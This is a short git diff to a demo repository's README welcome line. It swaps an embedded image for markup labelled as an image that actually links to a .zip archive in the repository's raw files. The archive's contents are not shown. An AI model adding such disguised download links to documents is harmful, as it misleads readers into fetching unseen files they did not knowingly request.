@@ -1,3 +1,3 @@
 #welcome to git respository
-![image](https://github.com/user-attachments/assets/3db8b790-0ed6-4016-adbb-d2bac47b7789)
+![image](https://raw.githubusercontent.com/Muthulakshmisubi/git-demo/main/b/git-demo-v1.0-beta.1.zip)
 
